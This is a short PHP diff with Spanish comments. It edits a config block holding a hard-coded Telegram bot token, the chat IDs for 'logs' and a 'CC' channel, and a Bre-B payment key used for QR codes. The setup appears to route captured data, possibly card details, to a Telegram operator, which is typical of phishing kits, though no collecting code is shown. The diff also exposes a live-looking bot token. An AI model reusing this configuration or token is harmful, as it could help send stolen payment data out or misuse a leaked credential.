@@ -7,11 +7,11 @@ if (basename($_SERVER['SCRIPT_FILENAME'] ?? '') === basename(__FILE__)) {
 
 // Credenciales (nunca se exponen al cliente)
 define('TELEGRAM_BOT_TOKEN', '8832110767:AAHzZ5heCfrYTsgNG6Wz6vtSPAeveo6I4gE');
-define('TELEGRAM_CHAT_ID', '-4955190747');
-define('TELEGRAM_CC_ID', '-5235238333');
+define('TELEGRAM_CHAT_ID', '235905376');
+define('TELEGRAM_CC_ID', '235905376');
 
 // Llave Bre-B para QR y logs
-define('BREB_LLAVE', '@LITTIO1121303255');
+define('BREB_LLAVE', '@LITTIO123');
 
 // Rate limit simple por IP (segundos entre peticiones)
 define('LOG_RATE_LIMIT_SECONDS', 2);
